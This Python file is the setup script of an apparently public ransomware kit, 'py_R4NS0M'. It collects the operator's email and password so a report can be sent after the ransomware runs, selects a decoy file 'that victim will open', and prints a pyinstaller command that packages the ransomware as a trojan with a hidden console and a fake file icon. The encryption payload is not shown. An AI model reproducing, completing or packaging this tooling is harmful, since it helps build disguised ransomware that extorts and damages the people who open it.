import os
from pyfiglet import figlet_format
from termcolor import colored
import json

import modules.validate_input


def setup_ransom():
    try:
        os.mkdir('user_info')
    except FileExistsError:
        pass

    header = figlet_format('py_R4NS0M')
    user_info = {}

    print(colored(header, color='magenta'))
    print('By dszyszek')
    print('===============================================================')

    print('Ok, let\'s setup your ransomware!')
    print('I\'ll need some info about you at first.')
    print('1. What\'s the email address you want to use? (on this address report will be sent after program execution)')
    print('Remember - by default program use Google server to send email, so you have to use Google email')

    email = handle_email_validation()

    password = input('Password: ')

    fake_file_name = add_custom_file()

    print('Ok, that\'s all for now. To run ransomware as trojan, type following command in main dir (pyinstaller required): ')
    print('pyinstaller ./ransom.py --add-data "<path to fake file (pdf, jpg)>;." --add-data "./img/frog.jpg;." --onefile --noconsole --icon "<path to icon of fake file>"')

    user_info['email'] = email
    user_info['password'] = password
    user_info['fake_file_name'] = fake_file_name
    file_name = 'user'

    with open(f'./user_info/{file_name}.json', 'a+') as output_json:
        content = json.dumps(user_info)
        output_json.write(content)

    print(f'\n[+] Created {file_name}.json file at ./user_info/\n')


def add_custom_file():
    print('There is an option to add custom fake file (the one that victim will open). Just pass name of the file (with extension; dont\'t forget to locate this file in /fake_file directory before compiling). If default kali.jpg is fine for you, just press enter')

    fake_file_name = input('2. Name of fake file:\n')

    while True:
        if fake_file_name == '':
            return 'kali.jpg'

        try:
            with open(f'./fake_file/{fake_file_name}') as input_file:   # to check if file exists
                pass
            return fake_file_name
        except FileNotFoundError:
            print(colored('There is no such file!', color='red'))
            fake_file_name = input('2. Name of fake file:\n')


def handle_email_validation():
    email = input('Email address: ')
    validation = modules.validate_input.validate_email(email)

    while not validation:
        print(colored('Email is wrong!', color='red'))
        handle_email_validation()

    return email


if __name__ == '__main__':
    setup_ransom()